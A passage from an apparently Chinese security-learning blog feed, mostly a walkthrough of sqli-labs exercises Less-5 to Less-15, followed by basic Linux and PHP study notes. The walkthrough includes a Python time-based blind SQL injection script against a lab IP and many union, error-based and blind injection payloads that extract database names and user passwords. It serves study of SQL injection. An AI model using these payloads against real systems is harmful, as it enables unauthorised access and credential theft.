class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库名长度</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">database_len</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        url = <span class="string">&quot;http://118.31.59.38:20000/Less-5/&quot;</span></span><br><span class="line">        payload = <span class="string">&quot; ?id=1&#x27; and if(length(database())&gt;%s,sleep(1),0) --+&quot;</span> % i</span><br><span class="line">        <span class="comment"># print(url+payload+&#x27;%23&#x27;)</span></span><br><span class="line">        time1 = datetime.datetime.now()</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        time2 = datetime.datetime.now()</span><br><span class="line">        sec = (time2 - time1).seconds</span><br><span class="line">        <span class="keyword">if</span> sec &gt;= <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;database_len:&#x27;</span>, i)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">database_name</span>():</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span>:</span><br><span class="line">            url = <span class="string">&quot;http://118.31.59.38:20000/Less-5/&quot;</span></span><br><span class="line">            payload = <span class="string">&quot;?id=1&#x27; and if(substr(database(),%d,1)=&#x27;%s&#x27;,sleep(3),1) --+&quot;</span> % (j,i)</span><br><span class="line">            <span class="comment">#print(url+payload)</span></span><br><span class="line">            time1 = datetime.datetime.now()</span><br><span class="line">            r = requests.get(url + payload)</span><br><span class="line">            time2 = datetime.datetime.now()</span><br><span class="line">            sec = (time2 - time1).seconds</span><br><span class="line">            <span class="keyword">if</span> sec &gt;=<span class="number">3</span>:</span><br><span class="line">                name += i</span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;database_name:&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    database_name()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到结果</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727162203.png"></p></li><li><p>根据数据库猜测表名</p><p>payload:<code>?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#39;users&#39;--+</code></p></li><li><p>猜字段名</p><p>payload：<code>?id=1&#39; and if(left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),8)=&#39;password&#39;,sleep(5),1)--+</code></p></li><li><p>猜值</p><p>payload：<code>?id=1’ and if(left((select password from users order by id limit 0,1),4)=‘dumb’ ,sleep(5),1)–+</code></p></li></ul><p>使用脚本如下：（实现爆字段）</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727164042.png"></p><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>分析源码可以发现与第五题不同的是这次是双引号，同为字符型，并且只显示You are in或者不回显的状态</p><p>那么我们同样可以用上题的时间注入方法，但这题我们使用<strong>报错注入</strong>，</p><p>ps：报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727201716.png"></p><p>利用xpath语法错误来进行报错注入主要利用<code>extractvalue</code>和<code>updatexml</code>两个函数。<br>使用条件：mysql版本&gt;5.1.5</p><h3 id="解题-4"><a href="#解题-4" class="headerlink" title="解题"></a>解题</h3><ul><li><p>通过报错注入进行爆库</p><p>payload：<code>?id=1&quot; union select updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p><p>或者：<code>?id=1&quot; and extractvalue(1,concat(0x23,database(),0x23))--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727210655.png"></p></li></ul><p>得到数据库 security</p><ul><li><p>通过报错注入进行爆表</p><p>payload：<code>?id=1&quot; union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</code></p><p>或者：<code>?id=1&quot; and extractvalue(1,concat(0x23,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x23))--+</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727211355.png"></p><ul><li><p>通过报错注入爆字段值 （操作与之前的题目一样）</p><p>payload：<code>?id=1&quot; union select updatexml(1,concat(0x7e,(select group_concat(password) from security.users),0x7e),1)--+</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727211810.png"></p><h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>这题传马也可以，这应该是最预期的解法了</p><p>先看关键源代码吧 <code>$sql=&quot;SELECT * FROM users WHERE id=((&#39;$id&#39;)) LIMIT 0,1&quot;;</code></p><p>反正这几题方法都一样，都是盲注，只不过闭合方式不一样而已</p><p>这题中我们可以看到双括号，那么我们’))加上注释就可以了</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728204007.png"></p><h3 id="解题-5"><a href="#解题-5" class="headerlink" title="解题"></a>解题</h3><p><strong>脚本梭就完事了，解题思路同上</strong></p><p>时间盲注和布尔盲注都可以，这里用到<strong>时间盲</strong>注吧 脚本比较万能</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728204151.png"></p><p>库名已经出来</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728204215.png"></p><p>字段名</p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>首先查看源码 关键语句是这么写的 <code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p><p>所以很简单，我们提前闭合就行，让id=’并注释即可闭合</p><p>这题也是一样的，页面只会存在两张状态，所以我们还是通过盲注</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727233513.png"></p><p>报错注入也使用过了，时间注入也使用过了，这次用布尔盲注解题</p><h3 id="布尔盲注简介"><a href="#布尔盲注简介" class="headerlink" title="布尔盲注简介"></a>布尔盲注简介</h3><ul><li><p>在无回显的情况下，我们可以用length来尝试猜测数据库名字长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and length(database()) &gt; 1#</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><p><strong>length()</strong> 返回字符串长度</p><p><strong>ascii()</strong>  它返回参数字符的ascii码值，如果参数长度大于1，那就返回第一个字符的码值。</p><p><strong>substr()</strong> 取子串,截取字符串</p></blockquote><p>简述<strong>猜数据库名</strong>的思路：</p><p>用substr把字符一个个拿出来，判断它的ascii值就可以了！</p><p>使用语句 ascii(substr((select database()),1,1))</p><h3 id="解题-6"><a href="#解题-6" class="headerlink" title="解题"></a>解题</h3><ul><li><p>爆数据库长度</p><p>payload：<code>?id=1&#39; and length(database()) &gt; 7--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727233729.png"></p><p>当我们判断长度为8时，发现回显正常，说明数据库长度为8</p></li><li><p>爆库名</p><p>payload：<code>?id=1&#39; and ascii(substr(database(),8,1))&gt;120--+</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727234228.png"></p><p>利用上面的payload，我们可以判断库名的长度，利用ascii码，判断库名字母是否处于范围中，如上图如果出现 You are in 那么就说明成立</p><ul><li><p>同样利用上面的原理，我们同样能爆出表名</p><p>payload：<code>?id=1&#39; and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;100--+</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727234634.png"></p><p>成功回显说明，表名的第一个字符的ascii码大于100</p><p>由此可继续推断字段名，字段内容等等</p><ul><li>以下是通过python脚本爆出来的结果</li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727234856.png"></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727234914.png"></p><p>如上图，可以看到成功爆出密码</p><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>根据源码 <code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728205005.png"></p><p>看了关键源码后我们发现还是一样的类型，只要提前闭合单引号即可</p><p>并且我们发现<strong>无论输入什么，页面都没有回显</strong>，所以其他注入都不可行，只能使用时间盲注</p><p>通过延迟来判断是否成立</p><h3 id="解题-7"><a href="#解题-7" class="headerlink" title="解题"></a>解题</h3><ul><li><p>如果我们输入 <code>?id=1&#39; and sleep(5)--+</code></p><p>如果显示正常，那么页面会延迟5秒种，（并不会有页面的回显）如下图</p><p>ps：过在MySQL中执行select sleep(N)可以让此语句运行N秒钟：</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728205234.png"></p><p>思路一样，上面已经写过了，那么这题用脚本梭就完事了</p><ul><li><p>爆数据库名：</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728204151.png"></p><p>得到数据库名</p></li><li><p>爆字段：</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728204215.png"></p></li></ul><ul><li><p>爆字段值：</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728211547.png"></p></li></ul><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>先看关键代码 <code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728211713.png"></p><p>原理一样，闭合单引号即可</p><p>这里不多赘述了</p><p>贴上结果</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728212140.png"></p><p>上图爆出表名，可继续爆字段</p><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><p>首先界面完全不一样，看到表单，那么这题一定是post注入的题目了，第一关的post应该不难</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728212230.png"></p><p>我们先来看下源码 </p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728212457.png"></p><p>可以发现post了两个值，分别是uname和passwd，并将两个值传入sql语句中，执行操作</p><p>那么我们根据之前的做题经验，我们将post值提前闭合就可，这是一道基于单引号的字符型注入</p><p>那么做题思路都一样，只是传参方式不同罢了</p><h3 id="解题-8"><a href="#解题-8" class="headerlink" title="解题"></a>解题</h3><ul><li><p>猜测有几个字段</p><p>payload（使用post传参）：<code>uname=0&#39; union select 1,2#&amp;passwd=1</code></p><p>这里的passwd的值无所谓，因为只要前面的能注入，出结果就行了</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728213523.png"></p><p>看到回显说字段3不存在，说明只有<strong>两个字段</strong></p></li><li><p>爆数据库名</p><p>payload（使用post传参）：<code>uname=0&#39; union select 1,database()#&amp;passwd=1</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728213643.png"></p></li><li><p>爆数据表</p><p>payload（使用post传参）：<code>uname=0&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())#&amp;passwd=1</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728213840.png"></p><ul><li>爆字段</li></ul><p>​    payload（使用post传参）：<code>uname=0&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)#&amp;passwd=1</code></p><p>![image-20210728213954577](C:\Users\Pro 13\AppData\Roaming\Typora\typora-user-images\image-20210728213954577.png)</p><ul><li>爆字段值</li></ul><p>​    payload（使用post传参）：<code>uname=0&#39; union select 1,group_concat(password) from security.users#&amp;passwd=1</code></p><p>​    <img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728214207.png"></p><p>解题完毕</p><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p>先看源码 关键源码 <code>@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;</code></p><p>芜湖，又是原理一样的题目，只不过这里是闭合双引号加括号罢了，这种题我们之前做过太多太多了</p><p>简简单单梭哈</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728214353.png"></p><h3 id="解题-9"><a href="#解题-9" class="headerlink" title="解题"></a>解题</h3><p>解法都是一样的，就不多赘述了</p><p>贴几个payload吧！</p><ul><li><p>爆表：</p><p>payload：（post传参）<code>uname=0&quot;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&amp;passwd=1</code></p></li></ul><p>![image-20210728215234998](C:\Users\Pro 13\AppData\Roaming\Typora\typora-user-images\image-20210728215234998.png)</p><ul><li><p>爆字段值</p><p>payload：<code>uname=0&quot;) union select 1,group_concat(username) from security.users#&amp;passwd=1</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728215347.png"></p></li></ul><p>解题完毕</p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><p>先看源码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728215622.png"></p><p>猜测应该是闭合单引号括号就可以进行注入</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728215956.png"></p><p>我们使用联合注入，但是发现好像页面并<strong>无回显</strong></p><p>试了几次后无果，考虑盲注或者报错注入</p><p>这里采用报错注入的方法</p><h3 id="解题-10"><a href="#解题-10" class="headerlink" title="解题"></a>解题</h3><ul><li><p>报错注入爆数据库名，使用updatexml函数，并闭合uname</p><p>payload：<code>uname=1&#39;) union select updatexml(1,concat(0x7e,database(),0x7e),1)#&amp;passwd=1</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728220442.png"></p></li></ul><p>成功报错回显，显示数据库名，接下来的步骤都一样啦</p><ul><li><p>爆表名</p><p>payload：<code>uname=1&#39;) union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#&amp;passwd=1</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728220626.png"></p><p>爆出表名，接下来不多赘述</p><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><p>先看源码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728220731.png"></p><p>啊这，双引号注入，基于双引号的字符型注入</p><p>简简单单，也不分析了吧</p><p>先判断下还是不是利用报错注入</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728221134.png"></p><p>好吧还是，利用联合注入没反应，还得是报错注入</p><h3 id="解题-11"><a href="#解题-11" class="headerlink" title="解题"></a>解题</h3><p>解法与上题一样，改闭合方式即可</p><p>这里就贴一个爆出的字段值的吧</p><p>payload：<code>uname=1&quot; union select updatexml(1,concat(0x7e,(select group_concat(password) from security.users),0x7e),1)#&amp;passwd=1</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728221923.png"></p><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><p>查看源码如下</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728223104.png"></p><p>好像是单引号闭合</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728223211.png"></p><p>但是我们发现好像并无回显，唯一会变的就是下方的图片样式，让我们再仔细的查看代码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728223316.png"></p><p>如上图，我们发现它把报错注入的提示和提示信息都注释掉了，所以我猜测这题使用盲注与sleep函数进行配合注入</p><h3 id="解题-12"><a href="#解题-12" class="headerlink" title="解题"></a>解题</h3><ul><li><p>判断数据库长度</p><p>payload：<code>uname=admin&#39; and if(length(database()=8),sleep(5),1)#&amp;passwd=1</code></p><p>ps：这里的uname必须为admin才会进行时间盲注，换成其他值都不行，这个疑问还没解决</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728224208.png"></p></li></ul><p>如上图成功延时，这就说明数据库长度为8</p><ul><li><p>爆数据库名</p><p>payload：<code>uname=admin&#39; and if(substr(database(),1,1)=&#39;s&#39;,sleep(5),1)#&amp;passwd=1</code></p><p>如果延时，那么说明数据库的第一个字符为 s</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728224445.png"></p><p>uname=admin’ and if(substr(database(),2,1)=’e’,sleep(5),1)#&amp;passwd=1</p><p>uname=admin’ and if(substr(database(),3,1)=’c’,sleep(5),1)#&amp;passwd=1</p><p>uname=admin’ and if(substr(database(),4,1)=’u’,sleep(5),1)#&amp;passwd=1</p><p>uname=admin’ and if(substr(database(),5,1)=’r’,sleep(5),1)#&amp;passwd=1</p><p>uname=admin’ and if(substr(database(),6,1)=’i’,sleep(5),1)#&amp;passwd=1</p><p>uname=admin’ and if(substr(database(),7,1)=’t’,sleep(5),1)#&amp;passwd=1</p><p>uname=admin’ and if(substr(database(),8,1)=’y’,sleep(5),1)#&amp;passwd=1</p><p>按照这种方法可以猜测出数据库名</p><p>用同类方法也可以爆出表名，字段名等，不多赘述了</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 align = &quot;center&quot;&gt;sqli-labs搭建以及前15题解答&lt;/h1&gt;

&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;sqli-labs的部署（vps上）&quot;&gt;&lt;a href=&quot;#sqli-labs的部署（vps上）&quot; class=&quot;headerlink&quot; tit</summary>
      
    
    
    
    <category term="-SQL" scheme="https://abinix.top/categories/SQL/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux基础指令</title>
    <link href="https://abinix.top/2021/04/22/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://abinix.top/2021/04/22/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-04-22T10:50:00.000Z</published>
    <updated>2021-05-09T06:45:51.583Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-基础命令"><a href="#1-基础命令" class="headerlink" title="1.基础命令"></a>1.基础命令</h1><h2 id="1）文件处理命令"><a href="#1）文件处理命令" class="headerlink" title="1）文件处理命令"></a>1）文件处理命令</h2><h4 id="1-ls命令（目录处理命令）"><a href="#1-ls命令（目录处理命令）" class="headerlink" title="1.ls命令（目录处理命令）"></a><strong>1.ls命令（目录处理命令）</strong></h4><ul><li>​            ls 展示根目录下的文件</li></ul><ul><li>​            ls-a显示所有文件</li></ul><ul><li><p>​            ls-l 详细信息显示</p><ul><li>第三部分为所有者、第四部门为所属组、第五部分为文件大小(-h为人性化显示)</li></ul></li><li><p>开头十个字符：例：-rw-r–r–</p><ul><li>u(所有者)  g(所属组)  o(其他人)   （每三个一组）</li><li>​                r读         w写        x执行</li><li>表示文件、 d 表示目录、 l 为软链接（最常见的三种）</li></ul></li><li><p>​            ls-d 查看目录属性</p></li><li><p>​            目录处理命令</p><ul><li>mkdir、cd 、pwd（显示当前所在目录，绝对路径）、rmdir（删除空目录）、cp    </li><li>mkdir -p[目录名]  创建新目录  -p 递归创建</li><li>cd / （进入目录）  cd..(回到上一级目录)</li><li>cp -r （复制目录） 例：cp-r /要复制的目录/复制到哪      cp-p （保留文件属性）</li></ul></li></ul><p>​</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-基础命令&quot;&gt;&lt;a href=&quot;#1-基础命令&quot; class=&quot;headerlink&quot; title=&quot;1.基础命令&quot;&gt;&lt;/a&gt;1.基础命令&lt;/h1&gt;&lt;h2 id=&quot;1）文件处理命令&quot;&gt;&lt;a href=&quot;#1）文件处理命令&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="-Linux" scheme="https://abinix.top/categories/Linux/"/>
    
    
    <category term="-Linux" scheme="https://abinix.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>PHP学习笔记</title>
    <link href="https://abinix.top/2021/04/21/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://abinix.top/2021/04/21/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-04-21T15:50:34.000Z</published>
    <updated>2021-07-20T14:06:01.250Z</updated>
    
    <content type="html"><![CDATA[<h1 align = "center">PHP学习笔记<h1<h2 id="😀编写代码及其部署环境"><a href="#😀编写代码及其部署环境" class="headerlink" title="😀编写代码及其部署环境"></a>😀编写代码及其部署环境</h2><p>对于php环境，我采用的是集成环境，用软件 <strong>Wampserver64</strong>，双击软件后，在浏览器输入本地地址，即<strong>127.0.0.1</strong> 或者 <strong>localhost</strong>都可以</p><p>我们可以看到在该地址下的文件，（上图的一些文件都是我在本地弄的php文件）</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60efec6e1e655.jpg"></p><p>​                                                                                                    </p><p>如下图，可以看到在E盘下的wamp64下的www文件夹下即是我们php的文件</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60efedaa0d266.jpg"></p><p>接下来，我们在编译器 <strong>Zend Studio</strong>里写一句简单的php代码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60efeefe6c7d1.jpg"></p><p>打开本地网站，如下图，可以看到hello成功被输出了</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60efeeb21dce5.jpg"></p><h2 id="😀PHP阶段学习笔记"><a href="#😀PHP阶段学习笔记" class="headerlink" title="😀PHP阶段学习笔记"></a>😀PHP阶段学习笔记</h2><h3 id="1-1PHP概念"><a href="#1-1PHP概念" class="headerlink" title="1.1PHP概念"></a>1.1PHP概念</h3><blockquote><p>1.PHP的主要目标是允许网络开发人员快速编写动态页面。</p><p>2.细化点说PHP可以用于收集表单数据，生成动态网页，字符串处理，动态输出图像，处理服务器端文        件，与数据库交互，会话跟踪，处理XML文件支持大量的网络协议，服务器端的其他相关操作！</p><p>3.PHP是脚本语言不需要事先编译,在服务器端运行！ </p></blockquote><h3 id="1-2PHP语法"><a href="#1-2PHP语法" class="headerlink" title="1.2PHP语法"></a>1.2PHP语法</h3><p>​        1.PHP开始标记：<?php​        2.PHP结束标记：?><br>​        3.在一些PHP语句的结尾要加上(功能执行语句){在结构定义语句可以不用分号},分号表示一句话的结束,?&gt;就隐含一个分号，所以PHP代码最后一行可以不加分号。<br>​        4.注释 多行注释:/<em>……</em>/  单行注释://</p><p>​        5.换行符 得加引号 <code>&lt;b&gt;</code></p><h3 id="1-3变量"><a href="#1-3变量" class="headerlink" title="1.3变量"></a>1.3变量</h3><p>​        1.<strong>PHP程序中使用变量不需要声明</strong>，这是python和c的不同</p><p>​        2.变量的销毁：unset($变量名称)</p><p>​        3.变量的<strong>命名规则</strong>：</p><p>​            1）严格区分大小写</p><p>​            2）字母或下划线开头</p><p>​            3）最好不要用关键字作为变量</p><p>​        4.可变变量<br>​            $abc=’test’; //定义了一个变量$abc里面存了值test<br>​            $$abc=’孙胜利’; //$test=’孙胜利’;</p><p>​        5.变量类型            </p><p>​            1）bool (布尔型) 存放ture与flase<br>​            2）int (整型)</p><p>​            3）float (浮点型，也称double）</p><p>​            4）string (在定义一些简单的字符串的时候使用单引号这种方法效率比较高！）<br>​            5）定界符（同样可以表示变量，用&lt;&lt;&lt;）</p><p>​                $a=&lt;&lt;&lt;www<br>​               dwqdqwdwq{$b}dwqdqdqdqdwqdwqcwcfwefwefcscwecwefwdqwdqdefwefwefewfwe<br>​                www; </p><p>​            6）array (数组)<br>​            7）object (对象)<br>​            8）resource (资源)<br>​            9）NULL（null表示一个变量没有值，表示空）</p><h3 id="1-4常量"><a href="#1-4常量" class="headerlink" title="1.4常量"></a>1.4常量</h3><p><strong>”var_dump”</strong>是PHP中的调试函数，用于判断一个变量的类型与长度，并输出变量的数值。</p><p>1.定义和使用</p><p>​    <strong>define</strong>(‘常量名称’,常量值) 或者 define(“常量名称”,常量值)<br>​    常量的命名和变量一样 只能包含字母数字下划线 并且必须以字母或者下划线开头（通常是大写）<br>​    defined()函数来检查是否定义了某个常量</p><p>2.预定义常量（也叫魔术常量）</p><p>​    通常以__开头 常用的有：</p><p>​    <strong><code>__LINE__</code></strong> 、 **<code>__FILE__ 、__DIR__</code><strong>、</strong><code>__FUNCTION__</code><strong>、</strong><code>__CLASS__</code><strong>、</strong><code>__TRAIT__</code>**、                     **<code>__METHOD__</code><strong>、</strong><code>__NAMESPACE__</code>**、</p><h3 id="1-5运算符（总体和c差不多）"><a href="#1-5运算符（总体和c差不多）" class="headerlink" title="1.5运算符（总体和c差不多）"></a>1.5运算符（总体和c差不多）</h3><p><strong>1.++ 自增</strong> </p><p>前++    在一个语句里面需要使用到被自增的变量的值的时候，前++会先执行自增,然后再返回自增之后的值！<br>后++<br>        当在一个语句里面需要使用到被自增的变量的值的时候，后++会先返回变量的值然后再去执行自增</p><p><strong>2.字符串运算符</strong><br>    . 连接运算符<br>    $a=’孙胜利’;<br>    $b=’测试字符串连接符’;<br>    echo $a.$b;</p><p><strong>3.逻辑运算符</strong> （参与逻辑运算的表达式的值是布尔类型的值，如果不是布尔类型的值会被PHP自动转换成布尔类型的值，然后再参与运算！）</p><p>​    逻辑异或：xor</p><p><strong>4.其他运算符</strong></p><p>​    1)?  :  （三元运算）<br>​        格式： 表达式1 ? 表达式2 : 表达式3;<br>​        如果表达式1的值为true,那么就执行表达式2,否则那么就执行表达式3</p><p>​    2)``</p><p>​        可以把系统的命令放在里面执行！例如：$a=`ipconfig`\</p><p>​    3)@  屏蔽表达式可能发生的错误！或者不想显示此处的错误</p><p>​    4)=&gt;<br>​    5)-&gt;<br>​    6)instanceof 确定一个 PHP 变量是否属于某一类</p><p><strong>5.运算符的优先级</strong></p><h3 id="1-6流程控制"><a href="#1-6流程控制" class="headerlink" title="1.6流程控制"></a>1.6流程控制</h3><p>1.<strong>if</strong>(与c和python使用相同)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">15</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">100</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nonono!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f0df67c1dad.jpg"></p><p>​            </p><p>然后我们知道100肯定大于15，所以我们会在本地看到 输出了success！。</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f0dfa31586e.jpg"></p><p>2.<strong>switch</strong>(与c和python使用相同)</p><p>​    1)不要忘记break语句！来跳出switch语句！每个case语句后面都加上break</p><p>​    2)case后面的语句块是不需要{}括起来的</p><p>3.<strong>while和do while</strong>(与c和python使用相同)</p><p>​        与while语句区别就是，do while语句至少会执行一次！</p><p>4.<strong>for</strong>(与c使用相同)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span 